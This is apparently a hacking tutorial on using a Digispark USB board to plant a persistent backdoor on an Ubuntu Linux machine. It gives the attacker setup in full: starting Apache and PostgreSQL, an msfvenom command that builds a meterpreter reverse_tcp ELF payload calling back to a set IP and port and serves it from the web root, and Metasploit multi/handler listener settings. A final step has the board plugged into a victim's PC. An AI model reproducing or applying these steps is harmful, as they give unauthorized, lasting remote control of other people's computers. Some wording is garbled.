# Backdoor (Linux Hacking)
The board is inserted into a free USB interface, the PC starts to download a malicious code from the attacker. This is executed on the Linux system to create a permanent (reverse) connection to the attacker. Since this connection can ever be interrupted for various reasons, a loop is built in, which sets up this connection after a predetermined period of time. It has virtually created a backdoor in the Linux system, which is always renewed. Regardless of whether the attacker is on the local network or on the Internet - he always has a permanent meter-to-peer connection and can execute further commands with the rights of the logged-in user (post-exploitation).

The attacker uses Kali Linux in the current version, the Metasploit framework and Apache as the web server. On the Linux system Ubuntu 16.04 LTS and Unity is used. This scenario can also be used with a few changes on a Linux server.


### Set up an attacker
- Postgresql, Apache2, and the Metasploit framework should be installed by default but not yet started.

  ```
  service postgresql start
  service apache2 start
  ```
- Next, the payload must be created and stored on the web server. We create the file **shell.elf** with the help of **msfvenom** and place it on the path of the web server:

  ```
  msfvenom  --platform linux  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=1337 -f elf > shell.elf cp shell.elf  /var/www/html
  ```
  
  Listener all response information from payload (victim's Linux OS) to attacker's computer with IP = 192.168.0.180, port number = 1337 and write a file shell.elf to html file
  For the variables LHOST (listener host) and LPORT (listener port), the IP address of the own system or the desired port is used.
  
  LHOST is also used to start a listener on a specific interface on your machine. For example:
  
  + use multi/handler
  + set payload windows/meterpreter/reverse-tcp
  + set lhost 0.0.0.0
  + set lport XXX
	
### Usage
- Prepare Kali Linux
- Open terminal:

  ```
  service postgresql start
  service apache2 start
  msfconsole -r shell.rc
  ```

- Plug Digispark into victim's PC and listener the their system 
